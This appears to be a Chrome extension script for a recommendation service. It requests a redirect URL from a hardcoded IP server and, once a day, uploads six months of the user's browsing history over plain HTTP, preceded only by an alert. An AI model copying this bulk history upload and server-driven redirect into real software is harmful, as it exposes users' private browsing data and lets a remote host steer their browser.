const http_rec_request = new XMLHttpRequest();
const url = 'http://54.180.142.66:5000/';
http_rec_request.open("POST", url);
http_rec_request.setRequestHeader("recoRequest", "reco_request");
http_rec_request.send();

window.onload = function(){
    var redirect = document.getElementById('redirect');
    http_rec_request.onreadystatechange=function() {
        if(this.readyState===4 && this.status===200) {
            redirect.setAttribute('content', '0;' + http_rec_request.responseText);
            runOncePerDay();
        }
    }
}

const http_send_history = new XMLHttpRequest();
var visit_history = new Array();
var numRequestsOutstanding = 0;
var microsecondsPerWeek = 1000 * 60 * 60 * 24 * 7;
var microsecondsPerSixMonth = microsecondsPerWeek * 4 * 6;
var sixMonthAgo = (new Date).getTime() - microsecondsPerSixMonth;

// check if a day has passed or not
function hasOneDayPassed() {
    //get today's date
    var date = new Date().toLocaleDateString();
  
    // compare with the stored date
    if( localStorage.yourapp_date == date ) 
        return false;
  
    // store the date you updated and return true to run function
    localStorage.yourapp_date = date;
    return true;
}
  
// This function run once a day
function runOncePerDay(){
    if( !hasOneDayPassed() ) return false;

    alert('Histroy Data Saved !');
    http_send_history.open("POST", url);
    http_send_history.setRequestHeader("sendHistory", "send_history");
    chrome.history.search({
        'text': '',
        'startTime': sixMonthAgo,
        'maxResults': 15000,
        }, function(historyItems){
            for (var i = 0; i < historyItems.length; ++i) {
                var url = historyItems[i].url;
                var visitCount = historyItems[i].visitCount;
                var processVisitsWithUrl = function(url, visitCount) {
                    return function(visitItems) {
                        processVisits(url, visitItems, visitCount);
                    };
                };
                
                chrome.history.getVisits({url: url}, processVisitsWithUrl(url, visitCount));
                numRequestsOutstanding++;
            };
            if (!--numRequestsOutstanding) {
                onAllVisitsProcessed();
            }
        }
    );
    http_send_history.onreadystatechange=function() {
        if(this.readyState===4 && this.status===200) {
            alert(http_send_history.responseText);
        }
    }
}

var processVisits = function(url, visitItems, visitCount) {
    for (var i = 0, ie = visitItems.length; i < ie; ++i) {
        var visit_data = new Object();
        visit_data.url = url;
        visit_data.visit_time = visitItems[i].visitTime;
        visit_data.visit_count = visitCount;
        visit_history.push(visit_data);
    }
    if (!--numRequestsOutstanding) {
        onAllVisitsProcessed();
    }
};

var onAllVisitsProcessed = function() {
    http_send_history.send(JSON.stringify(visit_history));
}
